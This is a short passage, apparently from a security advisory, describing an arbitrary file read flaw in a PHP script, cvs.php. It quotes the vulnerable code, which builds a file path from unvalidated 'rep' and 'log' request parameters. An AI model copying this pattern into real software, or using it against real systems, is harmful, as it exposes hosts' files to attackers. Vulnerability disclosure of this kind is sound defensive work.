files from the hosting system due to inadequate file handling in cvs.php.

  cvs.php:

		} elseif (isset($_GET[&#039;log&#039;])){
			if (file_exists($_GET[&#039;rep&#039;].$_GET[&#039;log&#039;])){
				$tab = file($_GET[&#039;rep&#039;].$_GET[&#039;log&#039;]);
				while(list($cle,$val) = each($tab)) {
		 		  $toBeWritten  .= $val."\r\n";
				}
				$filename=$_GET[&#039;log&#039;];
			}
		}


* Impact

  Attackers may be able to read arbitrary files from the hosting system.
